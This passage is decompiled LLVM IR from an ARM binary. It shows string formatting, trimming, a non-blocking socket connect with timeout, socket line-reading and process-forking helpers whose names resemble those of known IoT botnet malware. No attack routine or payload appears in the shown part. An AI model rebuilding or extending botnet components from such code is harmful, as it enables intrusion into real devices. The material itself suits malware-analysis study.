  %v7_8d54 = icmp eq i8 %v2_8d50, 99
  br i1 %v7_8d54, label %dec_label_pc_8d5c, label %dec_label_pc_8dcc

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8d4c
  %v1_8d60 = add i32 %stack_var_-32.133, 4
  %v1_8d6c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8d6c = load i32, i32* %v1_8d6c, align 4
  %v1_8d70 = urem i32 %v2_8d6c, 256
  store i32 %v1_8d70, i32* %stack_var_-18, align 4
  %v6_8d94 = call i32 @prints(i32 %tmp, i8* %v5_8d94, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8d60)
  %v2_8da0 = add i32 %v6_8d94, %stack_var_-40.132
  br label %dec_label_pc_8dcc

dec_label_pc_8dac:                                ; preds = %dec_label_pc_8a50, %dec_label_pc_8a8c
  %stack_var_-28.2 = phi i8* [ %v5_8a68, %dec_label_pc_8a8c ], [ %stack_var_-28.435, %dec_label_pc_8a50 ]
  %v2_8db0 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8db0 = zext i8 %v2_8db0 to i32
  %v3_8dbc = call i32 @printchar(i32* %arg1, i32 %v3_8db0)
  %v1_8dc4 = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8dcc

dec_label_pc_8dcc:                                ; preds = %dec_label_pc_8d4c, %dec_label_pc_8d5c, %dec_label_pc_8cf8, %dec_label_pc_8c94, %dec_label_pc_8c30, %dec_label_pc_8bcc, %dec_label_pc_8b90, %dec_label_pc_8dac
  %stack_var_-40.0 = phi i32 [ %v1_8dc4, %dec_label_pc_8dac ], [ %v2_8bb0, %dec_label_pc_8b90 ], [ %v2_8c14, %dec_label_pc_8bcc ], [ %v2_8c78, %dec_label_pc_8c30 ], [ %v2_8cdc, %dec_label_pc_8c94 ], [ %v2_8d40, %dec_label_pc_8cf8 ], [ %v2_8da0, %dec_label_pc_8d5c ], [ %stack_var_-40.132, %dec_label_pc_8d4c ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8dac ], [ %v1_8b5c, %dec_label_pc_8b90 ], [ %v1_8bd0, %dec_label_pc_8bcc ], [ %v1_8c34, %dec_label_pc_8c30 ], [ %v1_8c98, %dec_label_pc_8c94 ], [ %v1_8cfc, %dec_label_pc_8cf8 ], [ %v1_8d60, %dec_label_pc_8d5c ], [ %stack_var_-32.133, %dec_label_pc_8d4c ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8dac ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b90 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bcc ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c30 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c94 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8cf8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8d5c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8d4c ]
  %v4_8dcc = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8dd0 = add i32 %v4_8dcc, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8dd0 to i8*
  %v2_8ddc = load i8, i8* %stack_var_-28.4, align 1
  %v2_8de0 = icmp eq i8 %v2_8ddc, 0
  br i1 %v2_8de0, label %dec_label_pc_8de8, label %dec_label_pc_8a50

dec_label_pc_8de8:                                ; preds = %dec_label_pc_8a60, %dec_label_pc_8dcc, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8a60 ], [ %stack_var_-40.0, %dec_label_pc_8dcc ]
  %v2_8dec = icmp eq i32* %arg1, null
  br i1 %v2_8dec, label %dec_label_pc_8e04, label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8de8
  %v2_8df8 = load i32, i32* %arg1, align 4
  %v3_8e00 = inttoptr i32 %v2_8df8 to i8*
  store i8 0, i8* %v3_8e00, align 1
  br label %dec_label_pc_8e04

dec_label_pc_8e04:                                ; preds = %dec_label_pc_8de8, %dec_label_pc_8df4
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8ac8, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8a68, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8e04, { 1, 0 }
  uselistorder label %dec_label_pc_8de8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8dcc, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8dac, { 1, 0 }
  uselistorder label %dec_label_pc_8b90, { 1, 0 }
  uselistorder label %dec_label_pc_8b48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8b38, { 1, 0 }
  uselistorder label %dec_label_pc_8ac4, { 1, 0 }
  uselistorder label %dec_label_pc_8a50, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8e18 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  %v10_8e20 = load i32, i32* @lr, align 4
  store i32 36392, i32* %stack_var_-16, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e28 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8e30 = ptrtoint i32* %stack_var_-8 to i32
  %v14_8e48 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8e30, i32 %v2_8e28, i32 %arg1, i32 %v2_8e30, i32 %v3_8e20, i32 %v1_8e18, i32 %v10_8e20, i32 36392, i32 %arg2, i32 %arg3, i32 %arg4)
  ret i32 %v14_8e48

; uselistorder directives
  uselistorder i32 %v2_8e30, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8e5c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8e5c, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  %v3_8e7c = call i32 @strlen(i8* %arg1)
  %v2_8ebc.pre = load i32, i32* @global_var_1b514, align 4
  %v4_8ea4 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8e94, %dec_label_pc_8e9c ]
  %v2_8ea8 = add i32 %stack_var_-24.0, %v4_8ea4
  %v1_8eac = inttoptr i32 %v2_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v3_8eac = zext i8 %v2_8eac to i32
  %v2_8eb0 = mul nuw nsw i32 %v3_8eac, 2
  %v2_8ec0 = add i32 %v2_8eb0, %v2_8ebc.pre
  %v1_8ec4 = inttoptr i32 %v2_8ec0 to i8*
  %v2_8ec4 = load i8, i8* %v1_8ec4, align 1
  %v1_8ed0 = and i8 %v2_8ec4, 32
  %v2_8ed4 = icmp eq i8 %v1_8ed0, 0
  %v1_8e94 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8ed4, label %dec_label_pc_8eec.preheader, label %dec_label_pc_8e9c

dec_label_pc_8eec.preheader:                      ; preds = %dec_label_pc_8e9c
  %v1_8e84 = add i32 %v3_8e7c, -1
  %v5_8ef811 = icmp slt i32 %v1_8e84, %stack_var_-24.0
  br i1 %v5_8ef811, label %dec_label_pc_8f84.preheader, label %dec_label_pc_8efc

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8efc
  %v1_8ee4 = add i32 %stack_var_-20.012, -1
  %v5_8ef8 = icmp slt i32 %v1_8ee4, %stack_var_-24.0
  br i1 %v5_8ef8, label %dec_label_pc_8f84.preheader, label %dec_label_pc_8efc

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8eec.preheader, %dec_label_pc_8ee0
  %stack_var_-20.012 = phi i32 [ %v1_8ee4, %dec_label_pc_8ee0 ], [ %v1_8e84, %dec_label_pc_8eec.preheader ]
  %v2_8f08 = add i32 %stack_var_-20.012, %v4_8ea4
  %v1_8f0c = inttoptr i32 %v2_8f08 to i8*
  %v2_8f0c = load i8, i8* %v1_8f0c, align 1
  %v3_8f0c = zext i8 %v2_8f0c to i32
  %v2_8f10 = mul nuw nsw i32 %v3_8f0c, 2
  %v2_8f20 = add i32 %v2_8f10, %v2_8ebc.pre
  %v1_8f24 = inttoptr i32 %v2_8f20 to i8*
  %v2_8f24 = load i8, i8* %v1_8f24, align 1
  %v1_8f30 = and i8 %v2_8f24, 32
  %v2_8f34 = icmp eq i8 %v1_8f30, 0
  br i1 %v2_8f34, label %dec_label_pc_8f84.preheader, label %dec_label_pc_8ee0

dec_label_pc_8f84.preheader:                      ; preds = %dec_label_pc_8ee0, %dec_label_pc_8efc, %dec_label_pc_8eec.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8e84, %dec_label_pc_8eec.preheader ], [ %v1_8ee4, %dec_label_pc_8ee0 ], [ %stack_var_-20.012, %dec_label_pc_8efc ]
  br label %dec_label_pc_8f84

dec_label_pc_8f48:                                ; preds = %dec_label_pc_8f84
  %v2_8f6c = add i32 %v4_8fa4, %storemerge2
  %v1_8f70 = inttoptr i32 %v2_8f6c to i8*
  %v2_8f70 = load i8, i8* %v1_8f70, align 1
  %v3_8f74 = inttoptr i32 %v2_8fa8 to i8*
  store i8 %v2_8f70, i8* %v3_8f74, align 1
  %v1_8f7c = add i32 %storemerge2, 1
  %v3_8fa4.pre = load i8*, i8** %stack_var_-32, align 4
  br label %dec_label_pc_8f84

dec_label_pc_8f84:                                ; preds = %dec_label_pc_8f84.preheader, %dec_label_pc_8f48
  %v3_8f68 = phi i8* [ %v3_8fa4.pre, %dec_label_pc_8f48 ], [ %arg1, %dec_label_pc_8f84.preheader ]
  %storemerge2 = phi i32 [ %v1_8f7c, %dec_label_pc_8f48 ], [ %stack_var_-24.0, %dec_label_pc_8f84.preheader ]
  %v7_8f90 = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_8f9c = sub i32 %storemerge2, %stack_var_-24.0
  %v4_8fa4 = ptrtoint i8* %v3_8f68 to i32
  %v2_8fa8 = add i32 %v2_8f9c, %v4_8fa4
  br i1 %v7_8f90, label %dec_label_pc_8f94, label %dec_label_pc_8f48

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8f84
  %v3_8fb0 = inttoptr i32 %v2_8fa8 to i8*
  store i8 0, i8* %v3_8fb0, align 1
  ret i32 %v3_8e7c

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8e84, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8f84, { 1, 0 }
  uselistorder label %dec_label_pc_8f84.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8efc, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_8fe0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8fe0, i32* %arg2, align 4
  %v3_8ff8 = icmp eq i32 %v1_8fe0, -1
  %. = zext i1 %v3_8ff8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9078.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9028 = load i32, i32* @fp, align 4
  store i32 %v3_9028, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9050 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9064 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9078

dec_label_pc_9078:                                ; preds = %dec_label_pc_9078.lr.ph, %dec_label_pc_9078
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9078.lr.ph ], [ %v1_908c, %dec_label_pc_9078 ]
  %v5_9084 = mul nuw nsw i32 %storemerge628, 4
  %v6_9084 = add i32 %v5_9084, %v2_9064
  %v7_9084 = inttoptr i32 %v6_9084 to i32*
  store i32 0, i32* %v7_9084, align 4
  %v1_908c = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_908c, 32
  br i1 %tmp53, label %dec_label_pc_9078, label %dec_label_pc_90a0

dec_label_pc_90a0:                                ; preds = %dec_label_pc_9078
  %v13_9028 = ptrtoint i32* %stack_var_-16 to i32
  %v3_90a4 = udiv i32 %arg1, 32
  %v3_90b0 = mul nuw nsw i32 %v3_90a4, 4
  %v2_90b8 = add nsw i32 %v3_90b0, -160
  %v2_90bc = add i32 %v2_90b8, %v13_9028
  %v1_90c0 = inttoptr i32 %v2_90bc to i32*
  %v2_90c0 = load i32, i32* %v1_90c0, align 4
  %v1_90c8 = urem i32 %arg1, 32
  %v6_90d0 = shl i32 1, %v1_90c8
  %v2_90d4 = or i32 %v2_90c0, %v6_90d0
  store i32 %v2_90d4, i32* %v1_90c0, align 4
  %v1_90f4 = add i32 %arg1, 1
  %v2_9100 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9114 = call i32 @__libc_select(i32 %v1_90f4, i32 %v2_9064, i32 0, i32 %v2_9064, i32 %v2_9100)
  %v5_9128 = icmp sgt i32 %v5_9114, 0
  br i1 %v5_9128, label %dec_label_pc_92a8.preheader, label %dec_label_pc_9214.preheader

dec_label_pc_9214.preheader:                      ; preds = %dec_label_pc_90a0
  %v7_921c24 = icmp slt i32 %tmp34, 10
  br i1 %v7_921c24, label %dec_label_pc_9154.lr.ph, label %dec_label_pc_92a8.preheader

dec_label_pc_9154.lr.ph:                          ; preds = %dec_label_pc_9214.preheader, %dec_label_pc_9208
  %stack_var_-44.025 = phi i32 [ %v1_920c, %dec_label_pc_9208 ], [ %tmp34, %dec_label_pc_9214.preheader ]
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9154

dec_label_pc_9154:                                ; preds = %dec_label_pc_9154.lr.ph, %dec_label_pc_9154
  %storemerge716 = phi i32 [ 0, %dec_label_pc_9154.lr.ph ], [ %v1_9168, %dec_label_pc_9154 ]
  %v5_9160 = mul nuw nsw i32 %storemerge716, 4
  %v6_9160 = add i32 %v5_9160, %v2_9064
  %v7_9160 = inttoptr i32 %v6_9160 to i32*
  store i32 0, i32* %v7_9160, align 4
  %v1_9168 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_9168, 32
  br i1 %tmp54, label %dec_label_pc_9154, label %dec_label_pc_917c

dec_label_pc_917c:                                ; preds = %dec_label_pc_9154
  %v2_919c = load i32, i32* %v1_90c0, align 4
  %v2_91b0 = or i32 %v2_919c, %v6_90d0
  store i32 %v2_91b0, i32* %v1_90c0, align 4
  %v5_91f0 = call i32 @__libc_select(i32 %v1_90f4, i32 %v2_9064, i32 0, i32 %v2_9064, i32 %v2_9100)
  %v5_9204 = icmp sgt i32 %v5_91f0, 0
  br i1 %v5_9204, label %dec_label_pc_92a8.preheader, label %dec_label_pc_9208

dec_label_pc_9208:                                ; preds = %dec_label_pc_917c
  %v1_920c = add nsw i32 %stack_var_-44.025, 1
  %v7_921c = icmp slt i32 %v1_920c, 10
  br i1 %v7_921c, label %dec_label_pc_9154.lr.ph, label %dec_label_pc_92a8.preheader

dec_label_pc_92a8.preheader:                      ; preds = %dec_label_pc_9208, %dec_label_pc_917c, %dec_label_pc_9214.preheader, %dec_label_pc_90a0
  %v5_9250 = bitcast i8* %stack_var_-185 to i32*
  %not.v7_92b058 = icmp sgt i32 %arg3, 1
  %v2_92c860 = icmp eq i1 %not.v7_92b058, false
  br i1 %v2_92c860, label %dec_label_pc_92d0, label %dec_label_pc_9234

dec_label_pc_9234:                                ; preds = %dec_label_pc_92a8.preheader, %dec_label_pc_929c
  %v1_92ac63.in = phi i32 [ %v1_92ac63, %dec_label_pc_929c ], [ %arg3, %dec_label_pc_92a8.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_928c, %dec_label_pc_929c ], [ %arg2, %dec_label_pc_92a8.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_92a0, %dec_label_pc_929c ], [ 0, %dec_label_pc_92a8.preheader ]
  %v1_92ac63 = add i32 %v1_92ac63.in, -1
  %v2_9238 = load i32, i32* @global_var_1b898.46, align 4
  %v6_9250 = call i32 @__libc_recv(i32 %v2_9238, i32* %v5_9250, i32 1, i32 0, i32 %v1_92ac63)
  %v7_9258 = icmp eq i32 %v6_9250, 1
  br i1 %v7_9258, label %dec_label_pc_9278, label %dec_label_pc_9260

dec_label_pc_9260:                                ; preds = %dec_label_pc_9234
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_92e4

dec_label_pc_9278:                                ; preds = %dec_label_pc_9234
  %v3_9278 = load i8, i8* %stack_var_-185, align 1
  %v4_927c = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9278, i8* %stack_var_-40.062, align 1
  %v1_9288 = add i32 %v4_927c, 1
  %v5_928c = inttoptr i32 %v1_9288 to i8*
  %v3_9290 = load i8, i8* %stack_var_-185, align 1
  %v7_9294 = icmp eq i8 %v3_9290, 10
  br i1 %v7_9294, label %dec_label_pc_92d0, label %dec_label_pc_929c

dec_label_pc_929c:                                ; preds = %dec_label_pc_9278
  %v1_92a0 = add i32 %stack_var_-36.061, 1
  %not.v7_92b0 = icmp sgt i32 %v1_92ac63, 1
  %v2_92c8 = icmp eq i1 %not.v7_92b0, false
  br i1 %v2_92c8, label %dec_label_pc_92d0, label %dec_label_pc_9234

dec_label_pc_92d0:                                ; preds = %dec_label_pc_9278, %dec_label_pc_929c, %dec_label_pc_92a8.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_92a8.preheader ], [ %v1_92a0, %dec_label_pc_929c ], [ %stack_var_-36.061, %dec_label_pc_9278 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_92a8.preheader ], [ %v5_928c, %dec_label_pc_929c ], [ %v5_928c, %dec_label_pc_9278 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260, %dec_label_pc_92d0
  %storemerge = phi i32 [ -1, %dec_label_pc_9260 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_92d0 ]
  %v2_92f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_92f0, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_92ac63, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_920c, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_9064, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_92e4, { 1, 0 }
  uselistorder label %dec_label_pc_92d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9234, { 1, 0 }
  uselistorder label %dec_label_pc_9154, { 1, 0 }
  uselistorder label %dec_label_pc_9154.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9078, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_92fc = load i32, i32* @fp, align 4
  store i32 %v3_92fc, i32* %stack_var_-16, align 4
  %v13_92fc = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9324 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9334 = or i32 %v2_9324, 2048
  store i32 %v1_9334, i32* @r2, align 4
  %v2_9348 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9364 = urem i32 %arg3, 65536
  %v1_936c = call i32 @htons(i32 %v3_9364)
  %v3_9394 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_939c = icmp eq i32 %v3_9394, 0
  br i1 %v2_939c, label %dec_label_pc_93b0, label %dec_label_pc_93a4

dec_label_pc_93a4:                                ; preds = %entry
  br label %dec_label_pc_9568

dec_label_pc_93b0:                                ; preds = %entry
  %v3_93d8 = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_93d8 = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_93d8, i32 16)
  %v1_93e8 = icmp slt i32 %v4_93d8, 0
  br i1 %v1_93e8, label %dec_label_pc_93f0, label %dec_label_pc_952c

dec_label_pc_93f0:                                ; preds = %dec_label_pc_93b0
  %v0_93f0 = call i32 @__errno_location()
  %v1_93f8 = inttoptr i32 %v0_93f0 to i32*
  %v2_93f8 = load i32, i32* %v1_93f8, align 4
  %v7_93fc = icmp eq i32 %v2_93f8, 115
  br i1 %v7_93fc, label %dec_label_pc_9428.lr.ph, label %dec_label_pc_9520

dec_label_pc_9428.lr.ph:                          ; preds = %dec_label_pc_93f0
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9414 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9428

dec_label_pc_9428:                                ; preds = %dec_label_pc_9428.lr.ph, %dec_label_pc_9428
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9428.lr.ph ], [ %v1_943c, %dec_label_pc_9428 ]
  %v5_9434 = mul nuw nsw i32 %storemerge14, 4
  %v6_9434 = add i32 %v5_9434, %v2_9414
  %v7_9434 = inttoptr i32 %v6_9434 to i32*
  store i32 0, i32* %v7_9434, align 4
  %v1_943c = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_943c, 32
  br i1 %tmp32, label %dec_label_pc_9428, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9428
  %v3_9454 = udiv i32 %arg1, 32
  %v3_9460 = mul nuw nsw i32 %v3_9454, 4
  %v2_9468 = add nsw i32 %v3_9460, -160
  %v2_946c = add i32 %v2_9468, %v13_92fc
  %v1_9470 = inttoptr i32 %v2_946c to i32*
  %v2_9470 = load i32, i32* %v1_9470, align 4
  %v1_9478 = urem i32 %arg1, 32
  %v6_9480 = shl i32 1, %v1_9478
  %v2_9484 = or i32 %v2_9470, %v6_9480
  store i32 %v2_9484, i32* %v1_9470, align 4
  %v1_94a4 = add i32 %arg1, 1
  %v2_94ac = ptrtoint i32* %stack_var_-184 to i32
  %v5_94c4 = call i32 @__libc_select(i32 %v1_94a4, i32 0, i32 %v2_9414, i32 0, i32 %v2_94ac)
  %tmp33 = icmp slt i32 %v5_94c4, 1
  br i1 %tmp33, label %dec_label_pc_9514, label %dec_label_pc_94d4

dec_label_pc_94d4:                                ; preds = %dec_label_pc_9450
  %v0_94f8 = call i32 @getsockopt()
  %v3_94fc = load i32, i32* %stack_var_-192, align 4
  %v2_9500 = icmp eq i32 %v3_94fc, 0
  br i1 %v2_9500, label %dec_label_pc_952c, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94d4
  br label %dec_label_pc_9568

dec_label_pc_9514:                                ; preds = %dec_label_pc_9450
  br label %dec_label_pc_9568

dec_label_pc_9520:                                ; preds = %dec_label_pc_93f0
  br label %dec_label_pc_9568

dec_label_pc_952c:                                ; preds = %dec_label_pc_93b0, %dec_label_pc_94d4
  store i32 0, i32* @r2, align 4
  %v2_9538 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9548 = and i32 %v2_9538, -2049
  store i32 %v1_9548, i32* @r2, align 4
  %v2_955c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_9568

dec_label_pc_9568:                                ; preds = %dec_label_pc_9520, %dec_label_pc_9514, %dec_label_pc_9508, %dec_label_pc_93a4, %dec_label_pc_952c
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9514 ], [ 1, %dec_label_pc_952c ], [ 0, %dec_label_pc_9508 ], [ 0, %dec_label_pc_9520 ], [ 0, %dec_label_pc_93a4 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9414, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_9568, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_952c, { 1, 0 }
  uselistorder label %dec_label_pc_9428, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9578 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9578, i32* @ip, align 4
  %v3_957c = load i32, i32* @r4, align 4
  %v6_957c = load i32, i32* @r5, align 4
  %v9_957c = load i32, i32* @r6, align 4
  %v0_9588 = call i32 @__libc_fork()
  %v2_9598 = icmp eq i32 %v0_9588, 0
  br i1 %v2_9598, label %dec_label_pc_96f8, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %entry
  %v2_95b0 = load i32, i32* @global_var_1b890.48, align 4
  %v5_95b0 = load i32, i32* @global_var_1b894.49, align 4
  %v2_95bc = add i32 %v2_95b0, 1
  %v3_95bc = icmp eq i32 %v2_95bc, 0
  %v4_95c0 = zext i1 %v3_95bc to i32
  %v5_95c0 = add i32 %v4_95c0, %v5_95b0
  store i32 %v2_95bc, i32* @global_var_1b890.48, align 4
  store i32 %v5_95c0, i32* @global_var_1b894.49, align 4
  %v3_95d4 = udiv i32 %v2_95bc, 1073741824
  %v3_95d8 = mul i32 %v5_95c0, 4
  %v2_95dc = or i32 %v3_95d8, %v3_95d4
  store i32 %v2_95dc, i32* @r4, align 4
  %v3_95e0 = mul i32 %v2_95bc, 4
  %v1_95e4 = add i32 %v3_95e0, 4
  %v1_95ec = call i32 @malloc(i32 %v1_95e4)
  br label %dec_label_pc_9644

dec_label_pc_9604:                                ; preds = %dec_label_pc_9644, %dec_label_pc_9690
  %v3_9608 = mul i32 %storemerge2, 4
  %v2_9614 = add i32 %v3_9608, %v1_95ec
  %v2_9628 = load i32, i32* @global_var_1dafc.51, align 4
  %v2_962c = add i32 %v2_9628, %v3_9608
  %v1_9630 = inttoptr i32 %v2_962c to i32*
  %v2_9630 = load i32, i32* %v1_9630, align 4
  %v2_9634 = inttoptr i32 %v2_9614 to i32*
  store i32 %v2_9630, i32* %v2_9634, align 4
  %v1_963c = add i32 %storemerge2, 1
  br label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9604
  %storemerge2 = phi i32 [ 0, %dec_label_pc_95ac ], [ %v1_963c, %dec_label_pc_9604 ]
  %v2_965c = load i32, i32* @global_var_1b890.48, align 4
  %v5_965c = load i32, i32* @global_var_1b894.49, align 4
  %v2_9670 = add i32 %v2_965c, -1
  %v3_9670 = icmp ne i32 %v2_965c, 0
  %v3_9674 = add i32 %v5_965c, -1
  %v5_9674 = sext i1 %v3_9670 to i32
